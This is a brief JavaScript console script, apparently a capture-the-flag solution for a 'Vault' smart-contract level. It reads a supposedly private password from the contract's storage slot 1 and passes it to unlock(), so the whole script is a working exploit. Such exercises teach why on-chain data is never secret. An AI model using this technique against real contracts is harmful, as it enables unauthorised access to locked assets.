
/**
 * @notice You need to define this function in the console, then run it
 * @param {string} address Address of the Vault contract 
 */
async function hack(address) {
    // Get the hash
    const hash = await web3.eth.getStorageAt(address, 1);
    console.log(`Hash found: ${hash}`)

    // Unlock hash
    console.log("Unlocking...");
    await contract.unlock(hash);
    console.log(`Locked: ${await contract.locked()}`);
}